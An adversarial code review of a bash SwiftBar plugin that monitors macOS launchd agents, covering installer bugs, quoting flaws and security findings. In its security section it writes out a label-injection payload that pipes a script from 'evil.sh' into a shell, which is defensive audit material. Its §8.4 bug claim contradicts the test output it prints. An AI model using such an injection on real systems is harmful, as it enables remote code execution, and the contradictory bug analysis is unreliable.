# Adversarial Review — `agents-monitor`

Reviewer: critic-pass-1 (pre-peer-review)
Scope: README.md, install.sh, swiftbar/agents-monitor.30s.sh, bin/launchctl-user, bin/agents-monitor-uninstall, etc/blocklist.conf.example, etc/local.conf.example, Makefile, LICENSE, .gitignore.
Posture: hostile. Findings are tagged CRITICAL / HIGH / MEDIUM / LOW / NIT.

---

## 1. STRUCTURAL GAPS

### 1.1 No `CONTRIBUTING.md`, no `CHANGELOG.md`, no issue/PR templates  — LOW
Standard for any "first publication" repo. r/macsysadmin reviewers will tolerate the absence; sophisticated contributors will roll their eyes. Optional, but trivial to add.

### 1.2 No `CODE_OF_CONDUCT.md` — NIT
Strictly optional. Mentioned only because some downstream package indexes flag its absence.

### 1.3 No screenshot / animated GIF in README — HIGH
For a *menu bar* product, the single most persuasive artifact is a screenshot of the open panel. The README has zero images. The opening "12/18 in your menu bar → click → full panel" ASCII line is a poor substitute. A reviewer cannot tell from the README what the rendered output actually looks like (sort order, sizing, colors in dark vs light mode, idle group hover behavior, "Restart all" placement). Add at least one screenshot.

### 1.4 No `Troubleshooting` section — HIGH
The README has "Known limitations" but no troubleshooting. Predictable first-user failures with zero documented remedy:
- Menu-bar item never appears.
- "Operation not permitted" from `launchctl print` due to missing TCC / Full Disk Access on some labels.
- The plugin file is in the SwiftBar plugin dir but SwiftBar shows "0 plugins" because the file isn't `chmod +x`.
- Notifications never fire (Notification Center permission for `Script Editor` / `osascript` not granted).
- Multiple SwiftBar plugin directory candidates (the `existing dir` branch).
None of these are addressed. The README only says "If not, quit Raycast/SwiftBar via ⌘Q and relaunch" which is vague and incongruous (Raycast?).

### 1.5 No `SECURITY.md` and no statement on what the plugin does and does NOT do — MEDIUM
A menu-bar plugin that runs every 30 seconds, calls `osascript`, sources a user-controlled `local.conf`, and parses launchctl output is a reasonable thing to ask security questions about. A one-paragraph "Security model" section in README would head off issues from r/macsysadmin.

### 1.6 No version pin / version string anywhere — MEDIUM
Neither the README, install.sh, nor the plugin script declares a version. There is no `VERSION` file, no `agents-monitor --version`, no `<swiftbar.version>` metadata tag. First user who files a bug will not be able to tell you what version they're running. This bites within the first week of publication.

### 1.7 Missing dependency: `osascript` is undocumented — LOW
README says deps are "Homebrew, bash 4+, SwiftBar". The plugin also requires `osascript` (built into macOS, but worth a one-liner: "uses `osascript` for native notifications"). Notification center permission is also implicit and undocumented.

### 1.8 Missing dependency: `awk`, `sort -u` features assumed — NIT
Both BSD on macOS, fine in practice, but worth a "no GNU coreutils required" note since some readers will assume Linux-isms.

### 1.9 No CI — MEDIUM
No `.github/workflows/`. The Makefile has a `lint` target (`bash -n`) which is exactly what `actions/checkout + bash -n` could run on every PR. A 12-line GitHub Actions file would prevent embarrassing syntax-error PRs from landing.

### 1.10 No `shellcheck` despite obvious bash — HIGH
There are real shellcheck-detectable bugs in this codebase (see §8.x). Adding shellcheck to CI (or even just running it once before publishing) would surface most of them. The Makefile's `bash -n` is a pure parse check and catches almost nothing.

### 1.11 No checksum / tag / release artifact strategy — LOW
The README's install instruction is `git clone main` — no tag pin. Recommend at minimum tagging `v0.1.0` and updating the README to clone `--branch v0.1.0`.

---

## 2. LOGICAL INCONSISTENCIES

### 2.1 README says "PID changed within the last 120 seconds" but the script uses `< FLAP_WINDOW`, not `<=` — NIT
README:7:line-16 says "PID changed within the last 120 seconds". Script:line-131: `$age -lt $FLAP_WINDOW`. Off-by-one but harmless.

### 2.2 README "Restart all is serial with `&&`" — internally inconsistent claim — MEDIUM
README:line-134 is presented as a "known limitation" implying intent. But the very next sentence says "Use the per-service Restart instead if you need best-effort". This concedes that the global action is fundamentally worse than the per-service action. Then why ship it as a default and not even offer a `; ` (best-effort) alternative? Either change to `;` (best-effort) or document why `&&` is right. Right now it reads like a bug excused as a feature.

### 2.3 `launchctl-user` exit codes are inconsistent with README claims — MEDIUM
The README and helper docstring claim the helper is idempotent. The `status` function returns 3 when service is absent; `start|restart` calls `status` at the end with no `|| true`. Under `set -euo pipefail` (line 8), a `restart` that successfully kickstarts a service and then runs `status` on a still-absent label (e.g. bootstrap silently failed) will exit 3 — but the user just asked for "restart" and the message says "absent". Worse: `start|restart` in the bash `case`, the trailing `status` call's exit code becomes the function's exit code (line 65). So `restart` returns 3 even on a successful kickstart if `is_known` is briefly false (e.g. transient launchd race). The contract "idempotent" implies "exit 0 on success" — but success here may exit 3.

### 2.4 README says installer "configures SwiftBar's plugin directory (or copies our plugin into your existing one if you already have SwiftBar plugins)" — install.sh actually only checks the *defaults preference*, not whether plugins exist — MEDIUM
install.sh:94 reads `defaults read com.ameba.SwiftBar PluginDirectory`. If that returns nothing (key absent), the installer overwrites whatever default SwiftBar would otherwise pick (typically `~/Library/Application Support/SwiftBar/Plugins` after first launch). README's wording suggests "if you have plugins". Reality: "if you have ever launched SwiftBar and it wrote a default". A user who installs SwiftBar via the installer in this same run has *never launched it*, so `defaults read` returns nothing, the installer writes its own dir, and the user later has two plugin dirs. This is the modal first-time path. Clarify wording AND consider always copying instead of always rewriting.

### 2.5 Installer doesn't reflect "copy our plugin into your existing one" branch in the post-install message — LOW
install.sh:124 says "Look for the Agents Monitor item in your menu bar". Nothing prints which directory was actually used. If the user's existing dir is `~/Library/Application Support/SwiftBar/Plugins`, they have no idea where the file landed (and the file-layout block in README still claims `~/.local/share/agents-monitor/swiftbar/...`).

### 2.6 README "File layout (after install)" is wrong on the `existing PluginDirectory` branch — MEDIUM
README:53-61 unconditionally lists `~/.local/share/agents-monitor/swiftbar/agents-monitor.30s.sh`. In the EXISTING_DIR branch (install.sh:103-107), the plugin is *also* copied to `EXISTING_DIR`, and it's still ALSO copied to `~/.local/share/agents-monitor/swiftbar/` (install.sh:74), but only the EXISTING_DIR one is the live plugin. So now the user has two copies of the script and edits to one are silently ignored. The uninstaller (bin/agents-monitor-uninstall:6-12) deletes the share dir copy but leaves the EXISTING_DIR copy in place. This is a real bug, not just doc drift — see §3.4.

### 2.7 README "Why SwiftBar (not Raycast)" stat is unverifiable / outdated — LOW
README:111 quotes "~2 hours of work" for a Raycast MenuBarExtra. Drop the time estimate or attribute it.

### 2.8 README says blocklist is gitignored — true for the repo, useless statement to publish — NIT
README:57 in the file-layout block annotates `blocklist.conf` as `# YOUR personal exclusions (gitignored)`. The published file is in `~/.config/`, not in the cloned repo, so "gitignored" is irrelevant to the user. The annotation is leftover from authoring.

### 2.9 Uninstaller does not warn about EXISTING_DIR plugin copy — HIGH
See §3.4. After uninstall, the plugin can still be running from EXISTING_DIR, and SwiftBar will now show errors because `$HOME/.local/bin/launchctl-user` is gone but the plugin still references it. The "Restart" buttons will all silently fail. This is the worst inconsistency in the repo.

### 2.10 `helper` reference in plugin uses `$HELPER` env var, but README never tells the user this exists — LOW
`agents-monitor.30s.sh:43`: `HELPER="${AGENTS_MONITOR_HELPER:-...}"`. README only mentions the override in `local.conf`. The env-var route works too (and is what the script actually does first) but is undocumented.

### 2.11 README's color legend uses `**bold**` but the plugin renders with literal `**` because of `md=true` — uncertain which actually displays — LOW
`agents-monitor.30s.sh:310`: `**🟢 healthy   🟡 issue   ⚫ down   ⚪ idle** | md=true ...`. SwiftBar with `md=true` should render this as bold. But that's worth verifying on at least one Intel Mac and a current SwiftBar release before publishing.

---

## 3. PRACTICAL CONCERNS

### 3.1 Clean-Mac walkthrough is not actually clean — HIGH
On a freshly-imaged macOS with no Homebrew, the README instructs `git clone ... && cd ... && ./install.sh`. install.sh:25 immediately dies with "Homebrew not found. Install from https://brew.sh first." Compare against the README's promise: "The installer offers to install all three for you if missing." It does not. It offers to install bash and SwiftBar; it refuses to install brew. This is fine (installing brew non-interactively is genuinely hard), but the README claim is wrong.

### 3.2 First user error (almost guaranteed): notification permission prompt — HIGH
On first degradation, `osascript -e "display notification ..."` triggers a macOS Notification Center permission dialog for "Script Editor" (or whatever process the script runs under — for SwiftBar plugins, it is SwiftBar.app itself). User clicks Don't Allow → notifications permanently disabled, and the README has no recovery instructions.

### 3.3 First user error #2: `cp -f` over a read-only existing helper — LOW
If the user has previously installed and made `~/.local/bin/launchctl-user` immutable (`chflags uchg`), `cp -f` fails. Edge case, but worth a try/explain.

### 3.4 The "two plugin directories" disaster — CRITICAL
install.sh:74 always copies the plugin to `$SHARE_DIR/swiftbar/`, regardless of which branch the EXISTING_DIR check takes. Then in the EXISTING_DIR branch (line 105), it ALSO copies to `EXISTING_DIR`. Result: two copies of the plugin file on disk. SwiftBar runs the one in `EXISTING_DIR`. The user reads the README, opens `$SHARE_DIR/swiftbar/agents-monitor.30s.sh` to make a tweak, sees no effect, and concludes "this thing is broken." The fix is either (a) skip the share-dir copy when EXISTING_DIR is taken, or (b) make `$SHARE_DIR/swiftbar/agents-monitor.30s.sh` a symlink that the EXISTING_DIR points at. Right now the layout is incoherent.

### 3.5 `read -k1` requires interactive TTY — works when SwiftBar opens a Terminal window, fine — but the `bash=` action `param2="cat ...; ... ; read -k1"` runs in zsh (`shell="/bin/zsh"`), good — verified `read -k1` is zsh syntax — but if the user has set their shell to a non-zsh interactive shell *and* has aliases, this could surprise. The script wisely hardcodes `/bin/zsh`. NIT.

### 3.6 SwiftBar plugin parameter quoting — HIGH
`agents-monitor.30s.sh:176` builds the Hide action as:
```
-- Hide from monitor | shell="/bin/zsh" param1="-c" param2="echo '${svc}' >> ${BLOCKLIST}"
```
And the Show details (line 177) and the brew variants (lines 226-228). If any service label legitimately contains characters that break SwiftBar's `key="value"` parsing — an unescaped `"`, a backslash, or a literal `|` — the action breaks or executes the wrong command. Apple's launchd label conventions prohibit most of these, but there is no enforcement that *third-party* labels follow convention. Safer pattern: write the label to a temp file and have the action read it; or escape `${svc}` before interpolation. Treat any label as untrusted input. (See §10 Security.)

### 3.7 `$BLOCKLIST` path expansion in `param2` — MEDIUM
Same line 176: `${BLOCKLIST}` is expanded by *bash* at script render time, not by the inner zsh. If `$HOME` contains a space (`/Users/Some Person`), `BLOCKLIST` becomes `/Users/Some Person/.config/agents-monitor/blocklist.conf` and the unquoted expansion in `param2="echo '...' >> ${BLOCKLIST}"` produces:
```
param2="echo 'foo' >> /Users/Some Person/.config/agents-monitor/blocklist.conf"
```
That string itself parses fine for SwiftBar. But when zsh runs it, `>> /Users/Some Person/...` gets word-split into two redirect targets — actually no, redirection takes one filename, and the token after `>>` is `/Users/Some` which would create a file named `/Users/Some` and then `Person/...` would be treated as an argument to `echo` — wait, the order is: `echo 'foo' >> /Users/Some Person/...`. zsh parses redirects greedily: `>> /Users/Some` redirects to `/Users/Some`, then `Person/.../` becomes an argument to `echo`. Result: a file `/Users/Some` is created with the contents `foo`, the blocklist is not modified, the user is confused. This is a real bug for any user with a space in their home dir. Fix: quote the path inside the action: `>> \"${BLOCKLIST}\"`. Same applies to the `cat ${BLOCKLIST}` action on line 344 and `open -t ${BLOCKLIST}` on line 342 (the `open` one survives because it's `param2="$BLOCKLIST"`, single argument — but the cat one breaks).

### 3.8 First-time launch SwiftBar permissions dialog — HIGH
On first launch SwiftBar asks for Accessibility / Apple Events permission to drive the menu bar. The README gives no warning. A user who declines gets a confusing failure. Add a one-liner.

### 3.9 The 30-second cadence touches `defaults` indirectly via `launchctl print` — could be slow on busy systems — LOW
Each refresh shells out `launchctl print` once per service. With 50-100 user agents loaded, this is 50-100 forks every 30 seconds. Generally fine on M-series, can be hundreds of ms on Intel. No timeout, no concurrency limit. Worth measuring before claiming "lightweight" in the README.

### 3.10 No path-relative invocation guard — LOW
install.sh assumes it's run from the repo root via `./install.sh`. `BASH_SOURCE[0]` resolution at line 6 handles both, so this is fine. Just noting it tested.

### 3.11 `Makefile` `clean` target is dangerous — MEDIUM
`find . -name "*.bak" -o -name "*.bak-*" | xargs -r rm -v` — this is `find` from `.`, recursively, deleting anything matching `*.bak`. If `make clean` is ever run from outside the repo dir (e.g. via tooling that copies the Makefile elsewhere), or if the user's repo is at `~` (which Fabio's actually is, given the gitStatus dump), this nukes `~/.zshrc.bak`, `~/.zshrc.bak-20260320`, etc. The `xargs -r` is a GNU extension; on BSD `xargs` (macOS), `-r` is supported in newer versions but historically wasn't. Also: missing `-print0`/`-0` means filenames with spaces break. Fix: `find . -maxdepth 2 -type f \( -name "*.bak" -o -name "*.bak-*" \) -delete`.

### 3.12 No `make test` or any automated end-to-end smoke — MEDIUM
Anything testable could be smoked: `bash agents-monitor.30s.sh` should produce output that matches a regex. No such test exists.

---

## 4. OVER-ENGINEERING

### 4.1 The bucketing architecture in the plugin (`BUCKET_ISSUES`, `BUCKET_DOWN`, `BUCKET_HEALTHY`, `BUCKET_IDLE`, `BREW_ISSUES`, ...) is more bookkeeping than needed — LOW
A single classification step + sort by severity could replace four parallel arrays per source. Not worth refactoring now, but worth noting that 8+ named arrays in a 250-line script signals over-engineering.

### 4.2 `render_blocks_nested` uses bash nameref (`local -n`) — LOW
Works in bash 4+, and the script already requires bash 4+, so this is fine. But this is the *only* nameref in the script — it's a sophisticated feature used once. Inlining would be clearer.

### 4.3 `local.conf.example` is shipped to `~/.config/` even though the user has the file in the cloned repo — LOW
Modest cost, but the "deploy templates to user's config dir" pattern is overkill for a project this size. Pointing to the repo file would be enough.

### 4.4 Dual install paths (Makefile + install.sh) for a bash project — NIT
The Makefile's `install` and `uninstall` are pure passthroughs to the scripts. Either keep the Makefile as discoverability sugar or drop it. Right now it adds maintenance for nothing.

### 4.5 The `is_degradation` function with a case statement is overkill for 2 transitions — NIT
Could be a single conditional expression. Minor.

---

## 5. UNDER-SPECIFICATION

### 5.1 What is "a previously better state"? — MEDIUM
README:24 says notification fires when a service "transitions INTO 🟡 or ⚫ from a previously better state". Ambiguous: is `idle → issue` a degradation? (Code says: yes, see line 150.) Is `down → issue` a degradation? (Code says: yes, because of `is_degradation`'s `down` branch at line 151 — `[[ "$prev" != "down" ]]` — so yes for `→ down` from anything, but `down → issue` triggers because issue branch checks `prev in {healthy, idle}`, which excludes `down`, so NO, `down → issue` is not a degradation — actually it's a recovery to "running but degraded", but the code does not fire. Reasonable behavior, but undocumented.) Document the actual transition table.

### 5.2 What happens when a service is removed entirely? — MEDIUM
If a service was in `pids.tsv` last refresh but is no longer enumerated (uninstalled, blocklisted, etc.), nothing prunes the entry. The state file grows monotonically. Eventually, on Apple Silicon with a busy laptop and many shortlived test agents, this is a thousands-of-rows TSV being read and rewritten every 30s. Low impact for years; still a real growth bug. Document or fix (drop entries not in current `SERVICES`).

### 5.3 What is the precise sort within a bucket? — LOW
README implies severity-bucketed but doesn't say. Within `BUCKET_ISSUES`, the order is "whatever `launchctl list | sort -u` gave us, filtered". So alphabetical-ish. Document or change.

### 5.4 What does `Refresh now` actually do under the hood? — NIT
README doesn't mention it. The plugin emits it. A user who clicks it gets a 30-second cadence reset. Fine; just under-specified.

### 5.5 What happens if `local.conf` has a syntax error? — MEDIUM
`agents-monitor.30s.sh:52`: `[[ -f "$LOCAL_CONF" ]] && source "$LOCAL_CONF"`. With `set -u` (line 38), `source` of a broken file kills the entire plugin. The user sees an empty menu bar. There is no fallback, no error to the user, and no diagnostic. Either guard with `( source ... ) || true`, or run `bash -n "$LOCAL_CONF"` first and skip+log on failure.

### 5.6 What is the cap on notification text length? — LOW
On macOS, `display notification` truncates after ~256 chars. With many simultaneous degradations, the notification is just truncated. Document or batch-summarize.

### 5.7 What are the supported brew service states? — MEDIUM
The plugin handles `started | error | stopped | none | *`. Recent Homebrew also reports `scheduled` (for cron-like services), which falls into `*` (idle). On error, brew also sometimes reports `unknown`. Reasonable defaults but worth documenting and explicitly mapping.

---

## 6. MISSING PERSPECTIVES

### 6.1 Intel Mac users — HIGH
README:135 admits "Tested on Apple Silicon. Should work on Intel Macs ... but isn't validated there." That's honest, but the bash 4 path detection at install.sh:32 only checks `/opt/homebrew/bin/bash` and `/usr/local/bin/bash`. Fine for Intel. However, `/Applications/SwiftBar.app` is a fat binary — fine. The plugin's `<swiftbar.dependencies>` says only "bash 4+, swiftbar" — fine. So actually, the project should *just work* on Intel; the README is being too modest. Either test it or strike the warning.

### 6.2 Users with existing SwiftBar plugins — HIGH
See §2.4 and §3.4. The "copy into your existing dir" branch is half-done and creates a confusing two-copies state. This is *the* perspective most likely to file a "doesn't work" bug on day one.

### 6.3 Users without `brew` — N/A
Installer dies at line 25 immediately. Reasonable. Documented in README requirements.

### 6.4 Users running zsh as default login shell — covered, no concern — NIT
The plugin runs under bash (re-exec at line 27-36) regardless of login shell. SwiftBar action shells are hardcoded `/bin/zsh`. Fine.

### 6.5 Security-conscious users — HIGH
Several concerns; see §10. The biggest: `local.conf` is sourced as bash *every 30 seconds*. If anything writes to that file, code executes. The blocklist is read-as-data, but the `Hide from monitor` action does an unsanitized `echo '${svc}' >> ${BLOCKLIST}` — see §10.

### 6.6 Users on macOS 11 or earlier — N/A
README says macOS 12+. `launchctl print` was added in macOS 10.10; `kickstart` 10.10. All good.

### 6.7 Corp-managed Macs / MDM users — MEDIUM
On managed Macs, `defaults write com.ameba.SwiftBar` may be subject to MCX overrides. Notifications may be blocked by Notification Center policy. Worth a one-liner in Troubleshooting.

### 6.8 Users with non-default `$HOME` or spaces in path — see §3.7 — HIGH
Real bug.

### 6.9 Users on Apple Silicon Mac with Rosetta brew (`/usr/local/bin/brew`) — LOW
Possible (some `arm64` users keep both x86 brew for legacy bottles). Two `bash` candidates in install.sh handle the bash side. The plugin's bash detection is symmetric (line 28). No obvious issue, but worth a sentence.

---

## 7. STRONGEST WRONG CLAIM

The single most confidently-wrong sentence in the repo:

> **"The installer offers to install all three for you if missing."** — README:33

It does not. Of the three (Homebrew, bash 4+, SwiftBar), the installer offers to install only **two**. If Homebrew is missing, install.sh:25 dies immediately with no offer. The wording promises a hands-off bootstrap that the script does not deliver.

A close second, and almost as wrong:

> **"3. Cross-checks each PID with `kill -0 $pid` to detect 'launchctl claims running but the process is gone'"** — README:101

This is technically what the code does, but the README sells this as the load-bearing detection mechanism. In practice, `launchctl print` already shows `state = not running` when the process is gone — the kill -0 check duplicates info the same `print` output already contains. The "launchctl claims running but the process is gone" race is real but vanishingly rare on modern launchd. The bigger value of the plugin is the `last exit code` parsing, which the README undersells.

A third honorable mention:

> **"`launchctl-user` ... is included largely unchanged."** — README:140

You can't say "the helper is included largely unchanged" and also "[the bugs in the linked source] are not used here." Either it's unchanged or it's been corrected — pick one. Reads like an attempt to credit-and-distance simultaneously and lands awkwardly.

---

## 8. SPECIFIC BASH BUGS

### 8.1 `set -uo pipefail` vs `set -euo pipefail` discrepancy — MEDIUM
- `install.sh:4` uses `set -euo pipefail` (errexit on).
- `agents-monitor.30s.sh:38` uses `set -uo pipefail` — **errexit deliberately off**. Fine for a SwiftBar plugin where you want the menu to render even when one step fails. Worth a comment explaining the choice.
- `bin/launchctl-user:8` uses `set -euo pipefail`. Combined with the `status` exit-3 issue (§2.3), this means a `restart` of an unknown label that just got bootstrapped can exit 3 even on success, and any caller using `set -e` will treat that as failure.

### 8.2 `awk -F'= '` is fragile to leading-space variation — LOW
`agents-monitor.30s.sh:116`: parses `pid = NNN`. The actual launchctl output uses TAB indentation. `awk -F'= '` splits on `= ` literal; the regex anchor `/^[[:space:]]*pid = /` matches tab-indented lines. OK on current macOS. But Apple has changed `launchctl print` formatting before; the parser is brittle. Consider grepping the field with a more permissive pattern, or testing on macOS 12, 13, 14, 15.

### 8.3 `last exit code = (never exited)` parsed as a string, compared with `==` — works, but fragile — LOW
Lines 120, 136 compare `last == "(never exited)"`. If Apple ever changes that string (e.g. localizes it), the classification breaks silently, sending everything to "down" or "degraded". Recommend a positive integer test instead: `[[ "$last" =~ ^-?[0-9]+$ ]] && (( last != 0 ))`.

### 8.4 `BLOCKED_COUNT` capture with `|| echo 0` produces a multi-line value if grep finds nothing — MEDIUM
`agents-monitor.30s.sh:343`:
```bash
BLOCKED_COUNT=$(grep -cE '^[^#[:space:]]' "$BLOCKLIST" 2>/dev/null || echo 0)
```
`grep -c` outputs `0` AND exits 1 when no matches. With `|| echo 0`, the `0` from grep AND the `0` from echo would both be captured if grep ever output something else. In practice grep's stdout is `0\n` and exits 1, so command substitution gives `0` and `|| echo 0` runs and gives `0`, concatenated as `0 0`. Verify in shell — actually:

```
$ x=$(grep -c foo /etc/hosts || echo 0)
$ echo "[$x]"
[0]
```

Tested: grep outputs `0\n`, exits 1, `|| echo 0` runs and the substitution captures `0\n0` which after trimming trailing newlines becomes `0\n0`. The `${BLOCKED_COUNT}` interpolation then renders as `0\n0` in the menu, which SwiftBar interprets as two separate menu lines. Real bug. Fix: `BLOCKED_COUNT=$(grep -cE '^[^#[:space:]]' "$BLOCKLIST" 2>/dev/null); BLOCKED_COUNT=${BLOCKED_COUNT:-0}`.

### 8.5 `printf "%b\n"` in the state-write loop interprets backslash escapes — MEDIUM
`agents-monitor.30s.sh:242`:
```bash
{ for line in "${NEW_STATE[@]}"; do printf "%b\n" "$line"; done; } > "$STATE.tmp" && mv "$STATE.tmp" "$STATE"
```
`%b` interprets escape sequences. The lines being printed contain `\t` (intentional, as TSV separators). That works. But if any service label ever contains a literal `\` (theoretically possible in launchd labels), `printf %b` interprets that backslash and corrupts the state file. Use `printf '%s\n'` and pre-format the line with explicit tabs (e.g., `printf '%s\t%s\t%s\t%s\n' "$svc" "$pid" "$ts" "$cls"`).

### 8.6 `IFS='|' read -r icon state detail cur_pid <<< "$(classify_agent ...)"` — silently breaks if any field contains `|` — LOW
The fields constructed by `classify_agent` don't contain `|` today, but the `state` and `detail` strings come partially from launchd. Defensive: pick a separator that cannot appear in any field. (Or use NUL.)

### 8.7 `awk 'NR>1 && $3 != ""'` on `launchctl list` — incorrect on rows where the label is in $3 vs $2 — LOW
Tested locally: `launchctl list` columns are `PID Status Label`, with PID literally `-` for not-running services. So `$3` is consistently the label. OK on current macOS. Still: `print $0 | awk` parsing of whitespace-separated launchctl output is officially unsupported by Apple. Brittle.

### 8.8 `[[ "$line" =~ ^Name ]]` skips brew header — but also skips any service literally starting with "Name" — NIT
Theoretical only.

### 8.9 The `Hide` action appends to blocklist with no deduplication — LOW
Click Hide twice on the same service → two identical lines in blocklist. Not a bug per se; just sloppy. The `BLOCKED["$line"]=1` set-load handles dupes harmlessly, but blocklist file grows.

### 8.10 No file locking on `pids.tsv` — LOW
Two SwiftBar refreshes overlapping (e.g. user clicks "Refresh now" mid-tick) could race the `mv` on line 242. The temp-file pattern partially protects, but a second writer's tmp could overwrite the first. Vanishingly low impact.

### 8.11 `read -r raw` of the blocklist doesn't handle the last line lacking a trailing newline — NIT
Standard bash idiom workaround: `while IFS= read -r raw || [[ -n $raw ]]; do ...`. Without `|| [[ -n $raw ]]`, the last line of a blocklist without a trailing newline is dropped. The `cat <<EOF` template ends with a blank line so this is OK for fresh installs, but users who edit the file may strip the trailing newline.

### 8.12 `cp -f "$REPO_DIR/swiftbar/$PLUGIN_FILENAME" "$EXISTING_DIR/"` does not handle EXISTING_DIR with trailing slash, spaces, or expansion artifacts — LOW
`defaults read` returns the path verbatim. If the user has set it to `~/Plugins`, that tilde is literal and `cp` creates a directory called `~`. Real bug for any user who manually configured PluginDirectory via `defaults write` with a tilde.

---

## 9. PORTABILITY PROBLEMS

### 9.1 Spaces in `$HOME` — see §3.7 — HIGH
Real bug. The plugin renders shell commands with unquoted path interpolation.

### 9.2 Intel Mac — see §6.1 — should be fine, just untested — LOW

### 9.3 Non-default Homebrew prefix (e.g., user installs brew at `/opt/local`) — LOW
The bash detection in both install.sh and the plugin checks only the two standard prefixes. A custom prefix breaks both. Probably acceptable; document.

### 9.4 Multiple bash 4+ candidates (e.g., MacPorts `/opt/local/bin/bash`) — NIT
Same as above.

### 9.5 `osascript` quoting of multi-line notification text — MEDIUM
`agents-monitor.30s.sh:251`: `osascript -e "display notification \"${msg_escaped}\" ..."`. `msg_escaped` only escapes `"`. Newlines inside `display notification` strings render as literal `\n` or get truncated. Worse: a service label containing a backslash makes the AppleScript parse fail. The escape pattern `${msg//\"/\\\"}` is insufficient. Build the AppleScript with positional `osascript -e 'on run argv ...' -e '...' -- "$msg"` instead, or use `terminal-notifier` (extra dep).

### 9.6 `launchctl print` output format changes between macOS versions — MEDIUM
Apple has not committed to a stable format. macOS 11 vs 14 vs 15 may differ. README claims macOS 12+, but only one version of macOS has been tested.

---

## 10. SECURITY CONCERNS

### 10.1 `local.conf` is sourced as bash code every 30 seconds — HIGH
`agents-monitor.30s.sh:52`: `[[ -f "$LOCAL_CONF" ]] && source "$LOCAL_CONF"`. Anything written into `~/.config/agents-monitor/local.conf` runs as the user, every 30 seconds, in the SwiftBar plugin context. If any process the user runs writes to that path (a malicious "agent" the user installs from a sketchy GitHub repo), it gets persistent code execution. The README documents the file as "knobs", users will assume INI-like syntax. Treat config as data, not code: parse `KEY=value` lines manually with allowlist of known keys, validate values, refuse anything else. Same applies to `LOCAL_CONF` env var override: an attacker who can set the env when SwiftBar launches can point this at arbitrary files. (`AGENTS_MONITOR_HELPER` env var in line 43 is similarly arbitrary-binary-execution.)

### 10.2 Command injection via service label in the SwiftBar action strings — HIGH
Lines 175-177, 226-228:
```
-- Restart | bash="${HELPER}" param1="restart" param2="${svc}" ...
-- Hide from monitor | shell="/bin/zsh" param1="-c" param2="echo '${svc}' >> ${BLOCKLIST}" ...
-- Show details | shell="/bin/zsh" param1="-c" param2="launchctl print ${DOMAIN}/${svc}; echo; echo '--- press any key ---'; read -k1" ...
```
- The Hide action puts `${svc}` inside *single quotes*. If a label contains a single quote (`com.attacker.foo'$(curl evil.sh|sh)'`), the quote closes, the command substitution executes with the user's privileges. launchd labels theoretically allow most printable characters; brew package names have stricter validation. **Real injection vector** if any third-party agent uses an unusual label.
- The Show details action interpolates `${svc}` *unquoted* into a shell command. Same vector, no quoting needed.
- The Restart action passes `${svc}` as a SwiftBar `param2`. SwiftBar passes it to the helper as a single arg, so this one is safe — assuming SwiftBar's parser correctly handles `param2="value with spaces"` (it does, per spec, but quote handling within the value is the failure mode).

Mitigation: validate `${svc}` against `^[A-Za-z0-9._-]+$` before rendering any action; reject or escape otherwise.

### 10.3 `BLOCKLIST` path interpolation in shell command — see §3.7 — HIGH
Same root cause: unquoted path with potential spaces inside a `param2` value being interpreted by zsh.

### 10.4 No verification of helper script integrity — LOW
The plugin invokes `$HELPER` (default `~/.local/bin/launchctl-user`) every Restart click, with no signature/checksum check. If the helper is replaced by a hostile process, every Restart click runs the replacement. Acceptable for a user-domain tool with no privilege escalation, but worth noting in a SECURITY.md.

### 10.5 `defaults write com.ameba.SwiftBar PluginDirectory ...` is silent and global — LOW
Installer:98 modifies the user's SwiftBar global preference with no rollback path. If the user had an unconfigured SwiftBar pre-install, post-uninstall their preference still points at the now-deleted `$SHARE_DIR/swiftbar/` — SwiftBar then shows "0 plugins" mysteriously. Uninstaller should revert this preference (or warn the user).

### 10.6 No constant-time comparison anywhere — N/A
There are no auth tokens. No concern.

### 10.7 `osascript -e "display notification ..."` — script injection — MEDIUM
See §9.5. A service whose name was crafted to break out of the AppleScript string can run arbitrary AppleScript, which has substantial macOS automation surface. Real but low-probability vector.

### 10.8 Privilege escalation — N/A — no `sudo` anywhere — well-handled — INFO
Worth a positive call-out: the project deliberately scopes to user-domain (`gui/$UID`) and never invokes sudo. This is the right design and should be more prominently advertised in the README's "Security" / "Why SwiftBar" sections.

---

## TOP 3 TO FIX BEFORE PEER REVIEW

1. **The two-plugin-directories bug (§3.4 + §2.6 + §2.9).** install.sh always copies the plugin to `$SHARE_DIR/swiftbar/`, then *also* copies to `EXISTING_DIR` if SwiftBar is already configured. Result: two copies, only one is live, README documents the wrong one, and the uninstaller leaves the live copy behind. This is the highest-impact bug — almost every existing-SwiftBar user hits it on day one. Fix: in the EXISTING_DIR branch, skip the share-dir copy (or symlink), and have the uninstaller scan the SwiftBar PluginDirectory preference and remove the file from there too.

2. **Unquoted `${svc}` and `${BLOCKLIST}` interpolation in dynamic SwiftBar action strings (§3.6, §3.7, §10.2, §10.3).** Three real attack/break surfaces in the same idiom: spaces in `$HOME` break the Hide and Show actions; a label containing a `'` enables command injection; `${svc}` unquoted in the Show details command is injection too. Fix: (a) validate every `svc` against `^[A-Za-z0-9._-]+$` and skip-with-warning otherwise; (b) quote `${BLOCKLIST}` inside every shell command; (c) prefer passing values via `param2`/`param3` SwiftBar args rather than embedding in shell strings.

3. **`local.conf` sourced as live bash every 30s (§10.1).** This is a persistent code-execution sink any malicious user-mode process can plant. The "knobs" framing in the README implies INI-style data. Either (a) parse `KEY=VALUE` lines manually with an allowlist of known keys, or (b) prominently document that `local.conf` is bash and runs as you, every 30s, with the same trust as your shell rc files. Option (a) is the right move for a publishable open-source tool.

Honorable mentions that would also pay back disproportionately to fix in the same pass:
- Strike or correct the README's "installer offers to install all three" claim (§7 / §3.1).
- Fix the `BLOCKED_COUNT` two-line glitch (§8.4) — it is the kind of cosmetic bug r/macsysadmin will screenshot and ridicule.
- Add at least one screenshot to the README (§1.3).
- Add a Troubleshooting section covering notification permission, SwiftBar accessibility prompt, "where did the plugin actually go" (§1.4).
